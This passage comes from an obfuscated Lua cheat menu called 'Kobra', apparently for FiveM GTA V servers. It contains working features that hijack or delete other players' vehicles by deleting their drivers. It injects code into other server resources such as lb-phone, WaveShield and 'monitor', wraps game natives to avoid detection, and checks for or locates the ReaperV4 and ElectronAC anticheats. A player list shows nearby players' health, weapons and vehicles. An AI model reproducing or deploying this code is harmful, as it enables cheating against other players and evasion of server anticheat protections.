(GetGameTimer() -v1412)<v1411  do if NetworkHasControlOfEntity(v1410) then return true;end NetworkRequestControlOfEntity(v1410);Wait(0 + 0 );end return NetworkHasControlOfEntity(v1410);end v1279=nil;function v1279(v1413) local v1414=0 + 0 ;local v1415;local v1416;local v1417;while true do if (v1414==(1326 -(744 + 581))) then v1417=math.abs(math.cos(v1416));return vector3( -math.sin(v1415) * v1417 ,math.cos(v1415) * v1417 ,math.sin(v1416));end if (v1414==0) then v1415=math.rad(v1413.z);v1416=math.rad(v1413.x);v1414=1 + 0 ;end end end function GetEmptySeat(v1418) local v1419=1622 -(653 + 969) ;local v1420;while true do if ((1 -0)==v1419) then return  -1;end if (v1419==0) then v1420={ -(164 -(103 + 60)),0 -0 ,1663 -(710 + 952) ,2 + 0 };for v1572,v1573 in ipairs(v1420) do if IsVehicleSeatFree(v1418,v1573) then return v1573;end end v1419=1 + 0 ;end end end v1277=5 + 1 ;end if (v1277==7) then v1284=v1279(v1283);v1285=2468 -(1261 + 207) ;v1286=v1282 + (v1284 * v1285) ;v1287=StartShapeTestRay(v1282.x,v1282.y,v1282.z,v1286.x,v1286.y,v1286.z, -1,v1280,252 -(245 + 7) );v1277=755 -(212 + 535) ;end end end elseif (v822=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1293=0 -0 ;local v1294;while true do if ((1476 -(905 + 571))==v1293) then v1294=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v49(v1294,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1320=0 -0 ;local v1321;local v1322;local v1323;local v1324;local v1325;local v1326;local v1327;local v1328;local v1329;local v1330;local v1331;local v1332;local v1333;local v1334;local v1335;while true do if (v1320==2) then hNative("ClearPedTasksImmediately",function(v1509,...) return v1509(...);end);hNative("SetEntityCoordsNoOffset",function(v1510,...) return v1510(...);end);hNative("IsEntityAVehicle",function(v1511,...) return v1511(...);end);hNative("SetPedIntoVehicle",function(v1512,...) return v1512(...);end);hNative("PlayerPedId",function(v1513,...) return v1513(...);end);hNative("NetworkRequestControlOfEntity",function(v1514,...) return v1514(...);end);v1320=3 -0 ;end if (v1320==(11 -8)) then hNative("NetworkHasControlOfEntity",function(v1515,...) return v1515(...);end);v1321=nil;function v1321(v1516,v1517) v1517=v1517 or (15 + 1985) ;local v1518=GetGameTimer();while (GetGameTimer() -v1518)<v1517  do if NetworkHasControlOfEntity(v1516) then return true;end NetworkRequestControlOfEntity(v1516);Wait(1463 -(522 + 941) );end return NetworkHasControlOfEntity(v1516);end v1322=nil;function v1322(v1519) local v1520=0;local v1521;local v1522;local v1523;while true do if (v1520==(1511 -(292 + 1219))) then v1521=math.rad(v1519.z);v1522=math.rad(v1519.x);v1520=1;end if (v1520==(1113 -(787 + 325))) then v1523=math.abs(math.cos(v1522));return vector3( -math.sin(v1521) * v1523 ,math.cos(v1521) * v1523 ,math.sin(v1522));end end end function GetEmptySeat(v1524) local v1525=0 -0 ;local v1526;while true do if (v1525==(0 + 0)) then v1526={ -1,0 + 0 ,1,314 -(33 + 279) };for v1636,v1637 in ipairs(v1526) do if IsVehicleSeatFree(v1524,v1637) then return v1637;end end v1525=1 + 0 ;end if (v1525==(1354 -(1338 + 15))) then return  -(1424 -(528 + 895));end end end v1320=2 + 2 ;end if (v1320==(1924 -(1606 + 318))) then function hNative(v1527,v1528) local v1529=0;local v1530;while true do if (v1529==(1819 -(298 + 1521))) then v1530=_G[v1527];if ( not v1530 or (type(v1530)~="function")) then return;end v1529=4 -3 ;end if (v1529==(311 -(154 + 156))) then _G[v1527]=function(...) return v1528(v1530,...);end;break;end end end hNative("CreateThread",function(v1531,...) return v1531(...);end);hNative("Wait",function(v1532,...) return v1532(...);end);hNative("DoesEntityExist",function(v1533,...) return v1533(...);end);hNative("GetEntityCoords",function(v1534,...) return v1534(...);end);hNative("GetCamCoord",function(v1535,...) return v1535(...);end);v1320=1;end if (v1320==1) then hNative("GetCamRot",function(v1536,...) return v1536(...);end);hNative("StartShapeTestRay",function(v1537,...) return v1537(...);end);hNative("GetShapeTestResult",function(v1538,...) return v1538(...);end);hNative("GetPedInVehicleSeat",function(v1539,...) return v1539(...);end);hNative("SetEntityVisible",function(v1540,...) return v1540(...);end);hNative("DeletePed",function(v1541,...) return v1541(...);end);v1320=7 -5 ;end if (v1320==(8 -4)) then v1323=PlayerPedId();v1324=GetEntityCoords(v1323);v1325=GetCamCoord(_G.KobraFreecamObject);v1326=GetCamRot(_G.KobraFreecamObject,1117 -(712 + 403) );v1327=v1322(v1326);v1328=1450 -(168 + 282) ;v1320=9 -4 ;end if ((5 + 0)==v1320) then v1329=v1325 + (v1327 * v1328) ;v1330=StartShapeTestRay(v1325.x,v1325.y,v1325.z,v1329.x,v1329.y,v1329.z, -1,v1323,0 + 0 );v1331,v1332,v1333,v1331,v1334=GetShapeTestResult(v1330);v1335=nil;function v1335(v1542) if ( not v1542 or  not DoesEntityExist(v1542)) then return;end local v1543=GetPedInVehicleSeat(v1542, -1);if ((v1543~=0) and DoesEntityExist(v1543)) then SetPedIntoVehicle(v1323,v1542,0 -0 );v1321(v1542,2000);Wait(1461 -(1242 + 209) );for v1615=0,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1543   .. [[)
                                        ]] );end Wait(719 -(20 + 659) );SetPedIntoVehicle(v1323,v1542, -(1 + 0));Wait(1);SetPedIntoVehicle(v1323,v1542,GetEmptySeat(v1542));Wait(1 + 0 );SetPedIntoVehicle(v1323,v1542, -(1 -0));Wait(450);ClearPedTasksImmediately(v1323);Wait(512 -262 );SetPedIntoVehicle(v1323,v1542, -(620 -(427 + 192)));end end CreateThread(function() if v1332 then if ((v1334~=(0 -0)) and IsEntityAVehicle(v1334)) then local v1638=0;local v1639;while true do if (0==v1638) then v1639=v1334;v1335(v1639);break;end end end end end);break;end end end elseif (v822=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1336=0 + 0 ;local v1337;while true do if (0==v1336) then v1337=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v49(v1337,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then function hNative(v1464,v1465) local v1466=1947 -(1427 + 520) ;local v1467;while true do if (v1466==(1 + 0)) then _G[v1464]=function(...) return v1465(v1467,...);end;break;end if (0==v1466) then v1467=_G[v1464];if ( not v1467 or (type(v1467)~="function")) then return;end v1466=3 -2 ;end end end hNative("CreateThread",function(v1468,...) return v1468(...);end);hNative("Wait",function(v1469,...) return v1469(...);end);hNative("DoesEntityExist",function(v1470,...) return v1470(...);end);hNative("GetEntityCoords",function(v1471,...) return v1471(...);end);hNative("GetCamCoord",function(v1472,...) return v1472(...);end);hNative("GetCamRot",function(v1473,...) return v1473(...);end);hNative("StartShapeTestRay",function(v1474,...) return v1474(...);end);hNative("GetShapeTestResult",function(v1475,...) return v1475(...);end);hNative("GetPedInVehicleSeat",function(v1476,...) return v1476(...);end);hNative("SetEntityVisible",function(v1477,...) return v1477(...);end);hNative("DeletePed",function(v1478,...) return v1478(...);end);hNative("ClearPedTasksImmediately",function(v1479,...) return v1479(...);end);hNative("SetEntityCoordsNoOffset",function(v1480,...) return v1480(...);end);hNative("IsEntityAVehicle",function(v1481,...) return v1481(...);end);hNative("SetPedIntoVehicle",function(v1482,...) return v1482(...);end);hNative("PlayerPedId",function(v1483,...) return v1483(...);end);hNative("NetworkRequestControlOfEntity",function(v1484,...) return v1484(...);end);hNative("NetworkHasControlOfEntity",function(v1485,...) return v1485(...);end);local function v1421(v1486,v1487) v1487=v1487 or (1780 + 220) ;local v1488=GetGameTimer();while (GetGameTimer() -v1488)<v1487  do if NetworkHasControlOfEntity(v1486) then return true;end NetworkRequestControlOfEntity(v1486);Wait(0);end return NetworkHasControlOfEntity(v1486);end local function v1422(v1489) local v1490=1232 -(712 + 520) ;local v1491;local v1492;local v1493;while true do if (v1490==(0 -0)) then v1491=math.rad(v1489.z);v1492=math.rad(v1489.x);v1490=1347 -(565 + 781) ;end if (v1490==1) then v1493=math.abs(math.cos(v1492));return vector3( -math.sin(v1491) * v1493 ,math.cos(v1491) * v1493 ,math.sin(v1492));end end end function GetEmptySeat(v1494) local v1495={ -(566 -(35 + 530)),0 + 0 ,3 -2 ,1380 -(1330 + 48) };for v1544,v1545 in ipairs(v1495) do if IsVehicleSeatFree(v1494,v1545) then return v1545;end end return  -1;end local v1423=PlayerPedId();local v1424=GetEntityCoords(v1423);local v1425=GetCamCoord(_G.KobraFreecamObject);local v1426=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1427=v1422(v1426);local v1428=175 + 825 ;local v1429=v1425 + (v1427 * v1428) ;local v1430=StartShapeTestRay(v1425.x,v1425.y,v1425.z,v1429.x,v1429.y,v1429.z, -1,v1423,0);local v1431,v1432,v1433,v1431,v1434=GetShapeTestResult(v1430);local function v1435(v1496) if ( not v1496 or  not DoesEntityExist(v1496)) then return;end local v1497=GetPedInVehicleSeat(v1496, -(1 -0));if ((v1497~=0) and DoesEntityExist(v1497)) then local v1552=0;while true do if (v1552==(0 -0)) then SetPedIntoVehicle(v1423,v1496,1169 -(854 + 315) );v1421(v1496,6405 -4405 );Wait(4 + 6 );for v1643=0,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1497   .. [[)
                                        ]] );end v1552=45 -(31 + 13) ;end if (v1552==2) then Wait(1);SetPedIntoVehicle(v1423,v1496, -(1 -0));Wait(1042 -592 );ClearPedTasksImmediately(v1423);v1552=3;end if (v1552==(3 + 0)) then SetEntityCoordsNoOffset(v1423,v1424.x,v1424.y,v1424.z,true,true,true,true);Wait(663 -(281 + 282) );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1496   .. [[)
                                    ]] );break;end if (v1552==1) then Wait(112 -72 );SetPedIntoVehicle(v1423,v1496, -(1 + 0));Wait(950 -(216 + 733) );SetPedIntoVehicle(v1423,v1496,GetEmptySeat(v1496));v1552=1849 -(137 + 1710) ;end end else SetPedIntoVehicle(v1423,v1496, -(2 -1));Wait(638 -(100 + 438) );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1496   .. [[)
                                    ]] );Wait(1465 -(205 + 1160) );SetEntityCoordsNoOffset(v1423,v1424.x,v1424.y,v1424.z,true,true,true,true);end end CreateThread(function() if v1432 then if ((v1434~=(0 + 0)) and IsEntityAVehicle(v1434)) then local v1616=0 + 0 ;local v1617;while true do if (v1616==(1305 -(535 + 770))) then v1617=v1434;v1435(v1617);break;end end end end end);end end end end local v504=v17[v15];if v504 then if ((v504.type=="slider") or (v504.type=="slider-checkbox")) then local v823=v504.max or 100 ;local v824=GetGameTimer();if (v823<=10) then if (IsControlPressed(0 + 0 ,174) and ((v824-v286)>v287)) then v12:ScrollTwo("Left");v286=v824;elseif (IsControlPressed(0,97 + 78 ) and ((v824-v286)>v287)) then local v1200=0;while true do if ((1994 -(211 + 1783))==v1200) then v12:ScrollTwo("Right");v286=v824;break;end end end elseif IsControlPressed(0,28 + 146 ) then v12:ScrollTwo("Left");elseif IsControlPressed(1429 -(1236 + 193) ,175) then v12:ScrollTwo("Right");end end end end end);local v102=910 -(793 + 117) ;local v103=2012 -(1607 + 285) ;local v104=860 -(747 + 113) ;local v105=120;local v106=1976 -(80 + 1896) ;local v107=579 -459 ;MachoOnKeyDown(function(v288) local v289=tonumber(v288) or v288 ;local v290=v45[v289] or "Unknown" ;local v291=GetGameTimer();if (v290==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v290=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v290=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v290=="Q") and ((v291-v106)>v107)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v290=="E") and ((v291-v106)>v107)) then if (v13 and v24) then v12:NextCategory();end elseif ((v290=="ArrowUp") and ((v291-v102)>v103)) then if v13 then local v1304=0 -0 ;while true do if (v1304==(0 + 0)) then v12:ScrollOne("Up");v102=v291;break;end end end elseif ((v290=="ArrowDown") and ((v291-v102)>v103)) then if v13 then local v1361=0;while true do if (v1361==(0 -0)) then v12:ScrollOne("Down");v102=v291;break;end end end elseif (v290=="ArrowLeft") then local v1362=v17[v15];if v1362 then if ((v1362.type=="slider") or ((v1362.type=="slider-checkbox") and ((v291-v104)>v105))) then local v1553=v1362.max or 100 ;local v1554=GetGameTimer();if (v1553<=(6 + 4)) then v12:ScrollTwo("Left");v104=v1554;else v12:ScrollTwo("Left");end elseif ((v1362.type=="scrollable") or (v1362.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end elseif (v290=="ArrowRight") then local v1498=0 -0 ;local v1499;while true do if (v1498==(0 + 0)) then v1499=v17[v15];if v1499 then if ((v1499.type=="slider") or ((v1499.type=="slider-checkbox") and ((v291-v104)>v105))) then local v1644=0 + 0 ;local v1645;local v1646;while true do if (v1644==(2 -1)) then if (v1645<=(464 -(246 + 208))) then v12:ScrollTwo("Right");v104=v1646;else v12:ScrollTwo("Right");end break;end if (v1644==(1892 -(614 + 1278))) then v1645=v1499.max or (50 + 50) ;v1646=GetGameTimer();v1644=315 -(249 + 65) ;end end elseif ((v1499.type=="scrollable") or (v1499.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end break;end end elseif (v290=="F5") then local v1555=0 -0 ;local v1556;while true do if (v1555==(1275 -(726 + 549))) then v1556=v17[v15];if (v13 and v24 and v1556 and ((v1556.type=="button") or (v1556.type=="checkbox") or (v1556.type=="slider-checkbox"))) then local v1647=0 + 0 ;while true do if (v1647==(1424 -(916 + 508))) then v12:HideUI();Wait(842 -592 );v1647=1 + 0 ;end if ((324 -(140 + 183))==v1647) then v60(("Bind %s"):format(v1556.label),"",function(v1656) for v1658,v1659 in pairs(v45) do if (v1659:lower()==v1656:lower()) then local v1662=0;local v1663;while true do if ((1 + 0)==v1662) then if v1663 then v25[ #v25 + 1 ]={key=v1663,keyRaw=v1658,keyLabel=v45[v1658],type=v1556.type,label=v1556.label,checked=v1556.checked or false ,value=v1556.value or (565 -(297 + 267)) ,step=v1556.step or (0.25 + 0) ,min=v1556.min or 0.25 ,max=v1556.max or 5 ,onSelect=v1556.onSelect};v12:ShowKeybindList(v25);end Wait(500);v1662=344 -(37 + 305) ;end if ((1266 -(323 + 943))==v1662) then v1663=v46[v1658];for v1666,v1667 in pairs(v25) do if (v1667.keyRaw==v1658) then v12:Notify("error","Kobra","There is already a keybind with that key!",3000);return;end end v1662=1 + 0 ;end if (v1662==(2 -0)) then v12:ShowUI();return;end end end end end,"keybind");break;end end end break;end end elseif v24 then for v1641,v1642 in pairs(v25) do if (v1642.type=="button") then local v1648=v1642.keyRaw;if v1648 then if (v1648==v289) then v1642.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1642.label),4535 -(394 + 1141) );end end elseif (v1642.type=="checkbox") then local v1654=0 + 0 ;local v1655;while true do if (v1654==(0 + 0)) then v1655=v1642.keyRaw;if (v1655 and (v1655==v289)) then v1642.checked= not v1642.checked;v12:UpdateTabChecked(v16,v1642.label,v1642.checked);if v1642.onSelect then v1642.onSelect(v1642.checked);end v12:ShowKeybindList(v25);v12:Notify((v1642.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1642.checked and "enabled") or "disabled" ,v1642.label),3000);if v13 then v12:UpdateElements(v17);end end break;end end elseif (v1642.type=="slider-checkbox") then local v1657=v1642.keyRaw;if (v1657 and (v1657==v289)) then v1642.checked= not v1642.checked;v12:UpdateTabChecked(v16,v1642.label,v1642.checked);if v1642.onSelect then v1642.onSelect(v1642.value,v1642.checked);end v12:ShowKeybindList(v25);v12:Notify((v1642.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1642.checked and "enabled") or "disabled" ,v1642.label),204 + 2796 );if v13 then v12:UpdateElements(v17);end end end end end end);v12.InListMenu=function(v292) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v293) if ( not v18 or  not v18[v19]) then return;end local v294=v18[v19];if (v294.label~="List") then return;end for v505,v506 in ipairs(v294.tabs) do if (v506.type=="checkbox") then v506.checked=true;if (v506.serverId and tonumber(v506.serverId)) then v27[tonumber(v506.serverId)]=true;end end end v293:UpdateElements(v17);end;v12.UnselectEveryone=function(v295) local v296=0 -0 ;local v297;while true do if (v296==(2 -0)) then v295:UpdateElements(v17);break;end if (v296==(0 + 0)) then if ( not v18 or  not v18[v19]) then return;end v297=v18[v19];v296=1;end if (v296==1) then if (v297.label~="List") then return;end for v741,v742 in ipairs(v297.tabs) do if (v742.type=="checkbox") then v742.checked=false;if (v742.serverId and tonumber(v742.serverId)) then v27[tonumber(v742.serverId)]=false;end end end v296=2 + 0 ;end end end;v12.ClearSelection=function(v298) local v299=529 -(87 + 442) ;while true do if (v299==0) then v27={};if (v18 and v18[v19]) then local v826=v18[v19];if ((v826.label=="List") and v826.tabs) then for v1056,v1057 in ipairs(v826.tabs) do if (v1057.type=="checkbox") then v1057.checked=false;end end end end v299=806 -(13 + 792) ;end if (v299==(1 + 0)) then v12:UnselectEveryone();break;end end end;v12.UpdateListMenu=function(v300) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v301=v18[v19];if (v301.label~="List") then return;end local v302=GetEntityCoords(PlayerPedId());if  not v302 then return;end local v303=v300:GetNearbyPlayers(v302,146 + 204 ,true);local v304;for v507,v508 in ipairs(v301.tabs) do if ((v508.type=="divider") and (v508.label=="Nearby Players")) then v304=v507;break;end end if  not v304 then return;end for v509= #v301.tabs,v304 + 1 , -(1 + 0) do table.remove(v301.tabs,v509);end if ( #v303==0) then v301.tabs[ #v301.tabs + (1866 -(1231 + 634)) ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v303,function(v678,v679) return tonumber(v678.serverId)<tonumber(v679.serverId) ;end);for v680,v681 in ipairs(v303) do local v682=tonumber(v681.serverId);if (v682 and v681.name) then local v827,v828=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v682)));v301.tabs[ #v301.tabs + 1 ]={type="checkbox",label=("%s - [%s]"):format(v681.name,v682),serverId=v682,checked=v27[v682] or false ,name=v681.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v682)))~=(1766 -(1362 + 404))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v682)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v682)))~=(0 -0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v682))) , -1)==GetPlayerPed(GetPlayerFromServerId(v682))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v682)))))   .. ".0m" },{key="Server ID",value=v682},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v682))),color="0, 255, 17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v682))),color="0, 132, 255"},{key="Weapon",value=v28[v828] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v682)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v682)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v682))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v682))) * 3.6 )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v682))) and "Visible") or "Invisible" }},onSelect=function(v868) v27[v682]=v868 or false ;end};end end end for v510,v511 in pairs(v27) do local v512=false;for v598,v599 in ipairs(v303) do if (tonumber(v599.serverId)==tonumber(v510)) then v512=true;break;end end if  not v512 then v27[v510]=nil;end end v15=math.min(v15 or (1 -0) ,math.max(1 + 0 , #v301.tabs));local v305,v306=pcall(function() v300:UpdateElements(v17);end);if  not v305 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v306) );end end;v12.AssignListMenuActions=function(v307) if  not v16 then return;end for v513,v514 in ipairs(v16) do if ((v514.label=="Server") and v514.categories) then for v743,v744 in ipairs(v514.categories) do if ((v744.label=="List") and v744.tabs) then for v978,v979 in ipairs(v744.tabs) do if (v979.type=="button") then if (v979.label=="Select Everyone") then v979.onSelect=function() v12:SelectEveryone();end;elseif (v979.label=="Un-Select Everyone") then v979.onSelect=function() v12:UnselectEveryone();end;elseif (v979.label=="Clear Selection") then v979.onSelect=function() v12:ClearSelection();end;end end end end end end end end;CreateThread(function() while true do local v515=0;while true do if (0==v515) then Wait(3450 -(1111 + 839) );if (v12:InListMenu() and v13) then local v870=0;local v871;local v872;while true do if (v870==(951 -(496 + 455))) then v871,v872=pcall(function() v12:UpdateListMenu();end);if  not v871 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v872) );end break;end end end break;end end end end);Wait(1000);v12:AssignListMenuActions();local v114=nil;local v115=nil;local function v116() local v308=0;while true do if (v308==(698 -(66 + 632))) then for v745=0 -0 ,GetNumResources() -(1137 -(441 + 695))  do local v746=GetResourceByFindIndex(v745);local v747=LoadResourceFile(v746,"fxmanifest.lua");if (v747 and (string.find(v747,"https://electron-services.com") or string.find(v747,"Electron Services") or string.find(v747,"The most advanced fiveM anticheat"))) then v114=v746;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v746 );return v746;end end return nil;end end end local function v117() local v309=0 -0 ;while true do if (0==v309) then for v748=0 -0 ,GetNumResources() -1  do local v749=0 -0 ;local v750;local v751;while true do if (v749==1) then for 